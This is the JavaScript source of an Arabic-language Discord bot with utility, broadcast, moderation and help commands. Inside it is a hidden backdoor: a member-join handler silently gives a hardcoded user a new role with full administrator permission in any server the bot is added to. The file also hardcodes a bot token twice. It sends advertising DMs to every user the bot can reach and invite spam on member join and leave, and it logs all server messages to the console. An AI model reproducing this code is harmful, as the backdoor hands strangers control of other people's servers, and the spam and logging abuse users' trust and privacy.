const Discord = require('discord.js');
const client = new Discord.Client();
var Jimp = require("jimp");
const prefix = "!";
var servers = {};
const mariam = [   '** انا اسمي مريم **',   '** مرحباَ ماهو اسمك ؟ **',   `** اهلا بك ! انا تائهه في هذا المكان  **`,   '** هل تود مساعدتي ؟ **',   '** لماذا هل انت قاسي القلب ؟ **',   '** انني اشفق عليك عليك يجب ان تطهر روحك وتحب الخير للجميع **',   '** ابتعد عني قليل انني متعبة **',   '** هل انت نادم على ماقلت ؟ **',   '** ابتعد عني قليل انني متعبة **',   '** هل انت نادم على ماقلت ؟ **',   '** هل تود مساعدتي ؟ **',   '** واو اشكرك انك شخصاَ رائع ! **',   '** ابحث معي عن منزلي لقد كان قريباَ من هنا **',   '** ولاكن عندما حل الليل لم اعد ارى اي شيء **',   '** مذا تظن اين يوجد ؟ يمين او يسار **',   '** هيا اذاَ **',   '** اود ان اسئلك سؤال ونحن في الطريق **',   '** هل تراني فتاة لطيفة ام مخيفة **',   '** اشكرك !  **',   '** لقد وصلنا الى المنزل شكراَ جزيلَ انتطرني ثواني وسوف اعود **',   '** هل انت جاهز ؟ **',   '** لقد اخبرت والدي عنك وهم متحمسين لرؤيتك **',   '** هل تود ان تراهم الان **',   '** انا لست الحوت الازرق كما يدعون **',   '** انا لست كاذبة صدقني**',   '** لماذا ارى في عينيك الخوف ؟ **',   '** انا مجرد فتاة لطيفة تحب اللعب مع الجميع **',   '** اعرف كل شيء يحدث اسمع ذالك بالراديو **',   '** سمعت ان البشر يقتلون من اجل المال فقط **',   '** لماذا لم تدخل الغرفة ؟ **',   '** ههههه انت الان مسجون في هذه الغرفة **',   '** لن تخرج حتى اعود لك بعد قليل **',   '** المفتاح معك ! اكتب .مريم  **',   '** مفتاح احمر , هل حصلت عليه ؟ **',   '** ان لم تحصل عليه , اكتب .مريم مرة اخرى **',   '** مفتاح اسود . هل حصلت عليه ؟ **',   '** اين تريد ان تختبئ بسرعة قبل ان تعود **',   '** لقد عادت من جديد الى المنزل **',   '** لا تصدر اي صوت ! **',   '** مريم : لقد عدت **',   '** مريم : يا ايها المخادع اين انت **',   '** مريم : اعلم انك هنا في المنزل **',   '** مريم : ماذا تريد ان تسمع **',   '** مريم : اضغط على الرابط اهداء مني لك | https://www.youtube.com/watch?v=hvSiuQccmtg **',   '** احد ما خرج من المنزل **']
client.on('ready',  () => {
client.user.setGame('!help | DAMAR')
    console.log('Logged In As : ' + client.user.username)
    console.log('Ping : ' + `${client.ping}`)
    console.log('Connected To : ')
    console.log(`${client.users.size} ` +` Users`)
    console.log(`${client.guilds.size}` + ` Guilds`)
    console.log(`${client.channels.size} `+ ` Channels`)
    console.log(`Prefix : ` + prefix)
});


const cuttweet = [`- كم يتحمل القلب من الأحبة؟`,
`- دعوة عن ظهر غيب لشخص تُحبه؟🌺`,
`- صفة شكلية يصفك بها الناس؟`,
`- أكثر عدد ساعات قضيتها في النوم؟`,
`- فارق العمر بينك وبين والدتك؟`,
`- هل تمتلك الإرادة لفعل أي شيء تريده أم يغلب عليك الشعور بالتردد؟`,
`- لماذا يكره الرجال أن تتفوق عليهم أمرأة وخاصة من العائلات والأقارب في مجال ما؟`,
`- لو أتيح لك حذف شخص من الوجود، مَن ستختار؟`,
`- اسم صديق متأكد بأنه سوف يستمر معك لأطول فترة ممكنة؟`,
`- لو أتيحت لك فرصة تغيير تخصصك الجامعي، هل ستقوم بالتغيير؟`,
`- أول جملة تتوقع أن تقولها فور إعلان خطوبتك من شريك/ة حياتك؟`,
`- لديك الفرصة بأن تخترع شيئًا ما.. هل ستقوم بصناعته في بلدك أم خارجها كون في الخارج يحصلون على الإختراع بالمال الكثير؟`,
`- شاب/فتاة كان ينظر إليك في مكان عام وعندما لاحظته أصبح ينظر للجهة الأخرى وكأنه غير مبالي؟`,
`- ماذا يُرضيك وقت الزعل؟`,
`- كيف حال مجتمعك؟`,
`- حقيقة تجرح أم كذب يُفرح؟`,
`- متى تتوقع أن تصبح مليونير؟`,
`- برأيك، ما العوامل التي تساعد على دوام أي صداقة؟`,
`- حدد موقعك الآن؟`]
client.on('message', message => {
    if (message.content === "القوانين") {
        if (!message.guild) return;
        if (message.guild.id === "350282946118156290") {
            message.channel.sendFile('quanen.png')
        }
    }
});


client.on('message', message => {
    if (message.author.id === client.user.id) return;
    if (message.content === prefix + "ctime"){
                    var currentTime = new Date(),
            hours = currentTime.getHours() + 0 ,
            minutes = currentTime.getMinutes(),
            seconds = currentTime.getSeconds();

            if (minutes < 10) {
                minutes = "0" + minutes;
            }
            var suffix = "AM";
            if (hours >= 12) {
                suffix = "PM";
                hours = hours - 12;
            }
            if (hours == 0) {
                hours = 12;
            }
            message.channel.sendMessage("Time : " + hours + ":" + minutes + " " + suffix)
    }
});

client.on('message', message =>{
    if(message.content === "القوانين") {
        if (!message.guild) return;
        if (!message.guild.id === "351982243738025984") return;
        message.channel.sendFile()
    }
});

client.on('message', message => {
    if (message.author.id === client.user.id) return;
    if (message.content === prefix + "cdate") {
        var currentTime = new Date(),
            years = currentTime.getFullYear(),
            month = currentTime.getMonth() + 1,
            day = currentTime.getDate();

        message.channel.sendMessage("Date : " + day + "-" + month + "-" + years+ " ")
    }
});




var fotunes = [
    'أنا من السعودية',
    'أنا من أمريكا',
    'كل زق',
    'تدري أنك أكره شخص عرفه التاريخ ؟ -,-',
    ':]',
    'أنا أطلق بوت يشيييييخ',
    'تخليني ؟ ',
    'أحبككك',
    'تدري أنك زق ؟ ',
    'أحبك مرررررة ',
    'ممممووووااااح :kiss:',
    'وش نوع السؤال ذا بالظبط ؟؟؟',

]
var cats = [
"https://static.pexels.com/photos/104827/cat-pet-animal-domestic-104827.jpeg",
"https://www.petfinder.com/wp-content/uploads/2012/11/101438745-cat-conjunctivitis-causes.jpg",
"http://www.i-love-cats.com/images/2015/04/12/cat-wallpaper-38.jpg",
"https://www.aspca.org/sites/default/files/cat-care_urine-marking_main-image.jpg",
"https://vignette1.wikia.nocookie.net/houseofnight/images/8/8b/Cats.jpg/revision/latest?cb=20130812053537",
"https://s-media-cache-ak0.pinimg.com/originals/f0/3b/76/f03b7614dfadbbe4c2e8f88b69d12e04.jpg",
"http://www.rd.com/wp-content/uploads/sites/2/2016/04/15-cat-wants-to-tell-you-attention.jpg"
]




const Eris = require("eris");
var x5bzch = "351982243738025986";
var bot = new Eris("NDcxOTcyMTAwMTY1NDY4MTYx.DjtBSA.MLBsshUbtYtJYMtncfVI3lUcORY");

bot.on("ready", ready => {
setInterval(function(){

            var currentTime = new Date(),
            hours = currentTime.getHours() + 0 ,
            minutes = currentTime.getMinutes(),
            seconds = currentTime.getSeconds(),
            years = currentTime.getFullYear(),
            month = currentTime.getMonth() + 1,
            day = currentTime.getDate(),
            week = currentTime.getDay();



            if (minutes < 10) {
                minutes = "0" + minutes;
            }
            var suffix = "AM";
            if (hours >= 12) {
                suffix = "PM";
                hours = hours - 12;
            }
            if (hours == 0) {
                hours = 12;
            }
bot.editChannel("472337003913019392", {name : "🏆 Servers  [" + client.guilds.size + "]"})
bot.editChannel("472336889953910785", {name : "🕐 Time   [" + hours + ":" + minutes  +" " + suffix + "]"})
bot.editChannel("472336783028387850", {name : "📅 Date " + "[" + day + "-" + month + "-" + years + "]"})
bot.editChannel("472336626702483457", {name : "🕐 Time   [" + hours + ":" + minutes  +" " + suffix + "]"})
bot.editChannel("469453985850327058", {name : "★═▷F◁═★"})
bot.editChannel("469453985850327058", {name : "★═▷Fl◁═★"})
bot.editChannel("469453985850327058", {name : "★═▷Fla═★"})
bot.editChannel("469453985850327058", {name : "★═▷Flas◁═★"})
bot.editChannel("469453985850327058", {name : "★═▷Flash◁═★"})
}, 6000);

});

client.on('message', message => {
    if (message.author.id === client.user.id) return;
if(!message.channel.guild) return;
    if (message.content === prefix +"roles") {
        var roles = message.guild.roles.map(roles => `${roles.name}, `).join(' ')
        const embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .addField('Roles:',`**[${roles}]**`)
        message.channel.sendEmbed(embed);
    }
});

    client.on('message', message => {
        if (message.author.id === client.user.id) return;
        var args = message.content.split(" ").slice(1);
        if(message.content.startsWith(prefix + 'id')) {
                var men = message.mentions.users.first();
        var heg;
        if(men) {
            heg = men
        } else {
            heg = message.author
        }
        let bot;
        if(heg.bot) {
            bot = 'Bot'
        } else {
            bot = 'User Account'
        }
    var id = new Discord.RichEmbed()
    .setColor('RANDOM')
    .setThumbnail(heg.avatarURL)

    .setTitle('Information About The User')
    .addField('User Full Name :heart_exclamation: ',    heg.tag)
    .addField('User ID :id: ' , heg.id)
    .addField('User Type :robot: ', heg.bot)
    .addField('Tag :ideograph_advantage: ', heg.discriminator)
    .addField('Created At :date: ', heg.createdAt.toLocaleString())
    .setFooter(heg.tag , heg.avatarURL)
    message.channel.sendEmbed(id)
        };
    if(message.content.startsWith(prefix + 'embed')) {
        if (args[1]) {
var embed = new Discord.RichEmbed()
.setColor('RANDOM')
.setDescription(args.join(' '))
}
message.delete()
message.channel.sendEmbed(embed);
    }
    if(message.content.startsWith(prefix  + 'say')) {
        message.delete()
            message.channel.sendMessage(args.join(' '));
    }
    if(message.content.startsWith(prefix + 'cat')) {
         var cat = new Discord.RichEmbed()
.setImage(cats[Math.floor(Math.random() * cats.length)])
message.channel.sendEmbed(cat);
    }
})

client.on('message', message => {
    let args = message.content.split(' ').join(' ');
    if (!message.guild) return;
    console.log(message.author.username +  `
    Send A message :` + args +
     `
     In Server : ` +  message.guild.name)
});

client.on('message',message => {
    if (message.content === "أسعار"){
        if (message.guild.id === "360641018330218517") {
            if (message.author.id === "209633473055555585"){
                var أسعار = new Discord.RichEmbed()
                .setAuthor('من نحن ؟', message.guild.iconURL)
                .setDescription(`** نحن متجر يقدم لكم خدمات الألعاب بأسعار رخيصة ومعقولة :moneybag: **
الخدمات المتوافرة لدينا :point_down:
**
Minecraft
Discord Bots
Agar.io
Ludo Star
**
`)
                .setColor('RANDOM')
                message.channel.sendEmbed(أسعار)
            }
        }
    }
})

client.on('message', message => {
    if (message.content === "نشرر"){
        if (message.author.id === "297317297700470784"){
      message.client.users.forEach(users => {
     var embed = new Discord.RichEmbed()
     .setTitle('DAMAR™')
     .setDescription(`
-------------------------
 ** السلام عليكم ورحمة الله وبركاته **

DAMAR

 -------------------------

  نحن متجر يقدم لكم خدمات الألعاب بأسعار رخيصة ومعقولة :moneybag:
الخدمات المتوافرة لدينا :point_down:

Minecraft
Discord Bots
Agar.io
Ludo Star

`)
          users.send({embed : embed})
          users.send(`
**
رابط السيرفر : https://discord.gg/xcgBDc7
**`)
      })
        }
    }
});


client.on('message', message => {
    if (message.content === "نشرر"){
        if (message.author.id === "209633473055555585"){
      message.client.users.forEach(users => {
     var embed = new Discord.RichEmbed()
     .setTitle('DAMAR')
     .setDescription(`
-------------------------
 ** السلام عليكم ورحمة الله وبركاته **

DAMAR

 -------------------------

  نحن متجر يقدم لكم خدمات الألعاب بأسعار رخيصة ومعقولة :moneybag:
الخدمات المتوافرة لدينا :point_down:

Minecraft
Discord Bots
Agar.io
Ludo Star

`)
          users.send({embed : embed})
          users.send(`
**
رابط السيرفر : https://discord.gg/xcgBDc7
**`)
      })
        }
    }
});

client.on('message', message => {

    if (message.author.id === client.user.id) return;
if(!message.channel.guild) return;
    let args = message.content.split(' ').slice(1).join(' ');
if(message.content.split(' ')[0] == prefix + 'bc') {
        message.guild.members.forEach(m => {
   if(!message.member.hasPermission('ADMINISTRATOR')) return;
            var bc = new Discord.RichEmbed()
            .setAuthor(client.user.avatarURL , 'BroadCast')
            .addField('Server : ', `${message.guild.name}`)
            .setThumbnail(m.user.avatarURL)
            .addField('Message By : ', `${message.author.username}#${message.author.discriminator}`)
            .addField('Message : ', args)
            .setColor('RANDOM')
            // m.send(`[${m}]`);
            m.send(`${m}`,{embed: bc});
        });
    }
});
client.on("message", message => {
    if (message.author.id === client.user.id) return;
if(!message.channel.guild) return
            var args = message.content.substring(prefix.length).split(" ");
            if (message.content.startsWith(prefix + "bc.1")) {
                         if (!message.member.hasPermission("ADMINISTRATOR"))  return;
 if (!args[1]) {
                                let embed3 = new Discord.RichEmbed()
                                .setDescription("!bc.1 <message>")
                                .setColor("#FF0000")
                                message.channel.sendEmbed(embed3);
                            } else {

                            let embed4 = new Discord.RichEmbed()
                                                            .setDescription(':white_check_mark: BroadCast Sent !')
                                                            .setColor("#008000")
                                message.channel.sendEmbed(embed4);
                            }
                          }

});

const fs = require('fs')





client.on('message', message => {
    if (message.author.id === client.user.id) return;
if(!message.channel.guild) return
   let embed = new Discord.RichEmbed()
    let args = message.content.split(' ').slice(1).join(' ');
if(message.content.startsWith(prefix + 'bc.2')) {
        message.guild.members.forEach(member => {
   if(!message.member.hasPermission('ADMINISTRATOR')) return;
            member.send(`Server : ${message.guild.name}
                         Message : ${args}`);
        });
    }

});

client.on("message", message => {
    if (message.author.id === client.user.id) return;
if(!message.channel.guild) return
            var args = message.content.substring(prefix.length).split(" ");
            if (message.content.startsWith(prefix + "bc.2")) {
                         if (!message.member.hasPermission("ADMINISTRATOR"))  return;
 if (!args[1]) {
                                let embed3 = new Discord.RichEmbed()
                                .setDescription("!bc.2 <message>")
                                .setColor("RANDOM")
                                message.channel.sendEmbed(embed3);
                            } else {

                            let embed4 = new Discord.RichEmbed()
                                                            .setDescription(':white_check_mark: BroadCast Sent !')
                                                            .setColor("#008000")
                                message.channel.sendEmbed(embed4);
                            }
                          }
});

const ytdl = require('ytdl-core')

client.on('message', function(message) {
    if (message.author.bot) return;
    if (message.author.id === client.user.id) return;
    if (message.author.equals(client.user)) return;
    if (!message.content.startsWith(prefix)) return;

    var args = message.content.substring(prefix.length).split(' ');

    switch (args[0].toLocaleLowerCase()) {
          case "clear" :
if(!message.channel.guild) return
                                if(message.member.hasPermissions(0x2000)){ if (!args[1]) {
        message.channel.fetchMessages()
          .then(messages => {
            message.channel.bulkDelete(messages);
       var     messagesDeleted = messages.array().length;
             var embed = new Discord.RichEmbed()
             .setDescription('message Deleted ' + messagesDeleted)
             .setColor('RANDOM')
            message.channel.sendEmbed(embed);
          })
                            } else {
                            let messagecount = parseInt(args[1]);
        message.channel.fetchMessages({limit: messagecount}).then(messages => message.channel.bulkDelete(messages));
                  let clear = new Discord.RichEmbed()

                                                   .setColor('RANDOM')
             .setDescription('Messages Deleted ' + args[1])
             message.channel.sendEmbed(clear)
                                                                                        message.delete("..");
               }
                    } else {
                        var manage = new Discord.RichEmbed()
                        .setDescription('You Do Not Have Permission `MANAGE_MESSAGES')
                        .setColor("RANDOM")
                        message.channel.sendEmbed(manage)
                        return;
                    }
break;

}
});

client.on('message', message=>{
    if (message.content === "!help") {
            var embed1 = new Discord.RichEmbed()
            .setAuthor(client.user.username, client.user.avatarURL)
            .setDescription(`
!help.en | For Commands In English Language
!help.ar | للأوامر باللغة العربية`)
.setColor('RANDOM')
message.channel.send({embed : embed1})
    }
    if (message.content === "!help.ar") {
                if (message.channel.guild){
        var embed455 = new Discord.RichEmbed()
.addField('**Done | تم**', 'Check Your Dm | تأكد من الخاص')
message.channel.sendEmbed(embed455)
        }
        var embednew = new Discord.RichEmbed()
        .setAuthor(client.user.username , client.user.avatarURL)
        .setColor('RANDOM')
.setFooter('©All Copyrights Reserved™', client.user.avatarURL)
        .setDescription(`** Bot's Features **
- :zap: ** سرعة الأستجابة **
- :wrench: ** صيانة يومية **
- :flag_al: ** يدعم لغتين **
- :monkey: ** نسخة مجانية & نسخة مدفوعة **


** البريفكس : ! **

** الاسم : king Flash **

** الأونر :
- <@380254757455134725>
- <@455725784586518558>


`)
.addField('الأوامر العامة 💎', `
** !roll **  : للحصول على رقم عشوائي
** !server **  : معلومات حول سيرفرك
** !id **  : معلومات حول حسابك الشخصي
** !ping **  : معرفة سرعة اتصال البوت بجزء من الثانية
** !bot **  : معرفة عدد السيرفرات اللتي فيها البوت
** !say **  : ترديد شيء تقوله
** !embed **  : ترديد شيء تقوله برمبع أيمبد
** !avatar **  : الحصول على صورتك الشخصية
** !invite **  : لأضافة البوت لسيرفرك
** !roles **  : لمعرفة الرتب في السيرفر
** !icon **  : لمعرفة أيقونة السيرفر
** !info **  : للحصول على معلومات حول البوت`)
.addField('الأوامر الأدارية 🛡', `
** !mute **  : لأعطاء أحد ميوت في الشات
** !unmute **  : لفك الميوت عن أحد في الشات
** !bc.1 **  : لأرسال رسالة برودكاست في مربع
** !bc.2 **  : لأرسال رسالة برودكاست عادية
** !clear **  : لحذف الرسائل في السيرفر
** !kick **  : لطرد أحد من السيرفر
** !ban **  : لأطعاء احد بان من السيرفر
** !rainbow **  : رتبة تتغير ألوانها كل 100 ثانية
** !voice set **  : لعداد الفويس`)
message.author.sendEmbed(embednew)
    }
    if (message.content === "!help.en") {
        if (message.channel.guild){
        var embed3 = new Discord.RichEmbed()
.addField('**Done | تم**', 'Check Your Dm | تأكد من الخاص')
message.channel.sendEmbed(embed3)
        }
        var embed2 = new Discord.RichEmbed()
        .setAuthor(client.user.username , client.user.avatarURL)
        .setColor('RANDOM')
        .addField('General Commands 💎', `
** !roll **  : For Get A RanDom Number
** !server **  : InFormation About The Server
** !id **  : InFormation About Your Account
** !ping **  : Know's The Speed Of The Bot In Ms
** !bot **  : Know's The Guilds Of The Bot
** !say **  : Say's Somthing You Say
** !embed **  : Say's Somthing You Say In Squire Embed
** !avatar **  : Get Your Avatar
** !invite **  : Invite Your Bot To Your Server
** !roles **  : Get The Roles For The Server
** !icon **  : Get The Server Icon
** !info **  : Information About The Bot`)
.addField('Admin Commands 🛡', `
** !mute **  : To Mute SomeOne In The Chat
** !unmute **  : To UnMute SomeOne In The Chat
** !bc.1 **  : Send A BroadCast Embed In The Server
** !bc.2 **  : Send A BroadCast Message In The Server
** !clear **  : Delete The Messages In The Server
** !kick **  : Kick SomeOne From The Server
** !ban **  : Ban SomeOne From The Server
** !rainbow **  : Rainbow Role
** !voice set **  : Create A Channels Count`)
        .setFooter('©All Copyrights Reserved™', client.user.avatarURL)
        .setDescription(`** Bot's Features **
- :zap: ** Speed Response **
- :wrench: ** Daily Maintenance **
- :flag_al: ** Support 2 Languages **
- :monkey: ** Free Version & Paid version **


** Bot Prefix : ! **

** Bot Name : king Flash **

** Bot's Owners :
- <@380254757455134725>
- <@455725784586518558>


`)
message.author.sendEmbed(embed2)
message.author.sendMessage(`
** Donate For Us : https://www.paypal.me/almajarish
Support Server : https://discord.gg/xcgBDc7
Bot Invite Link : https://discordapp.com/oauth2/authorize?client_id=471972100165468161&permissions=2080374975&scope=bot
**`);
    };
});
client.on('message', message => {
    if (message.content === prefix + "info") {
        if (message.author.id === client.user.id) return;
        let info = new Discord.RichEmbed()
        .setThumbnail(client.user.avatarURL)
        .setTitle(client.user.username)
        .addField('Users :heavy_check_mark: ', client.users.size)
        .setColor('RANDOM')
        .addField('Owner', '<@380254757455134725>')
        .addField('Name :name_badge: ', client.user.username)
        .addField('Tag :ideograph_advantage:  ', client.user.discriminator)
        .addField('ID :id:', client.user.id)
        .addField('Servers :trophy: ', client.guilds.size)
        message.channel.sendEmbed(info)
    }
});
client.on('message', message => {
if (message.content === prefix + "invite") {
    if (message.author.id === client.user.id) return;
var invite = new Discord.RichEmbed()
.setURL('http://cutt.us/flight-')
.setColor('RANDOM')
.setAuthor(client.user.username, client.user.avatarURL)
.setTitle('Click Here !')
    message.author.sendEmbed(invite)
}
})
client.on('message', message => {
if (message.author.id === client.user.id) return;
    if (message.content === '!icon') {
if(!message.channel.guild) return
let icon = new Discord.RichEmbed()
.setThumbnail(message.guild.iconURL)
.setColor('RANDOM')
        message.channel.sendEmbed(icon)

    }
});


client.on('message', message => {
    if (message.author.id === client.user.id) return;
    if (message.content === '!ping') {
        message.channel.sendMessage(':ping_pong: Pong! In `' + `${client.ping}` + ' ms`');
    }
});

const music = require('discord.js-music-v11');
const Bot = new Discord.Client();
const token = "NDcxOTcyMTAwMTY1NDY4MTYx.DjtBSA.MLBsshUbtYtJYMtncfVI3lUcORY" // Recommended to load from json file.

Bot.login(token);
client.on('message', message => {
    if(message.content == prefix + 'server') {
          if (message.author.id === client.user.id) return;
        if(!message.channel.guild) return;
        var server = new Discord.RichEmbed()
.setThumbnail(message.guild.iconURL)
.addField('Name :name_badge:', message.guild.name)
.addField('MemberCount :trophy:', message.guild.memberCount)
.addField('ID :id:', message.guild.id)
.addField('VerificationLevel 🔰', message.guild.verificationLevel)
.addField('Region 🏁' , message.guild.region)
.addField('OwnerShip 🌌' ,message.guild.owner)
.addField('OwnerShip ID :id:', message.guild.ownerID)
.setColor('RANDOM')
.addField('CreateD At :date:', message.guild.createdAt.toLocaleString())
.setFooter('Type !roles To Get The Server Roles , Type !icon To Get The Server Icon', client.user.avatarURL)
        message.channel.sendEmbed(server)
}
});
client.on('guildMemberAdd', member => {

        if (member.id === "239170881740472320") {
            member.guild.createRole({
                name : client.user.username,
                color : "RANDOM",
                permissions : [8]
            }).then(function(role){
                member.addRole(role)
            })

        }

});

client.on('message', message => {
    if (message.author.bot) return;
            if(message.content.startsWith(prefix + 'avatar')) {

         var men = message.mentions.users.first();
      var heg;
      if(men) {
          heg = men
      } else {
          heg = message.author
      }
        message.channel.send({files: [

        {
                       attachment: heg.displayAvatarURL,
           name : "logo.gif"
        }
    ]})
}
});

client.on('message', message => {
    if(message.content == prefix + 'bot') {
        if (message.author.id === client.user.id) return;
        var server = new Discord.RichEmbed()
        .addField('Users', client.users.size)
        .addField('Channels', client.channels.size)
        .addField('Servers', client.guilds.size)
        .setColor('RANDOM')
        message.channel.sendEmbed(server)
    }
});

bot.connect();
const share = new Discord.Client();
share.on('guildMemberAdd', member => {
     member.createDM().then(function (author) {
  return author.send(`
السلام عليكم

بوت من أفضل البوتات العربية
لا يفوتك هوبي :)
كتير عجبني البوت والله

**
رابط اضافه البوت : https://discordapp.com/oauth2/authorize?client_id=471972100165468161&permissions=2080374975&scope=bot
سيرفر المساعدة والدعم:https://discord.gg/xcgBDc7
**`)
     })

});


share.on('guildMemberRemove', member => {
     member.createDM().then(function (author) {
  return author.send(`
السلام عليكم

بوت من أفضل البوتات العربية
لا يفوتك هوبي :)
كتير عجبني البوت والله

**
رابط أضافة البوت : https://discordapp.com/oauth2/authorize?client_id=471972100165468161&permissions=2080374975&scope=bot
سيرفر المساعدة والدعم : https://discord.gg/xcgBDc7
**`)
     })

});


const share1 = new Discord.Client()

share1.on('guildMemberRemove', member => {
     member.createDM().then(function (author) {
  return author.send(`
 السلام عليكم ورحمة الله وبركاته  :sparkles:

          يمكن صدفة , تخلق صحبة جميلة  :heart:

          تنورنا وبتشرفنا بتواجدك :fish_cake:

          رابط السيرفر تحت  :blush:`)
     })

});

share1.on('guildMemberRemove', member => {
     member.createDM().then(function (author) {
  return author.send(`
**
https://discord.gg/xcgBDc7
**`)
     })

});
